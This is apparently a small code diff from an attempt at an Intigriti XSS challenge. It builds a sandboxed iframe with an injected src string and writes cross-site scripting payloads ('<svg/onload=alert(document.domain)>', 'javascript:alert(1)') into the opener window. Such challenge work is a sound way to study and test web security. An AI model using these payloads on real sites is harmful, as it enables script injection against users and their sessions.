@@ -7,9 +7,9 @@
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#"test`;//'
     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation'
     iframe.onclick = function(e){
-        var myWindow = window.open(this.contentWindow.name, this.src);
+//         var myWindow = window.open(this.contentWindow.name, this.src);
 //         myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
-//         var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge1.png', '_blank');
+        var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge1.png', 'javascript:alert(1)');
         myWindow.opener.document.write('<svg/onload=alert(document.domain)>')
     }
     document.body.appendChild(iframe);
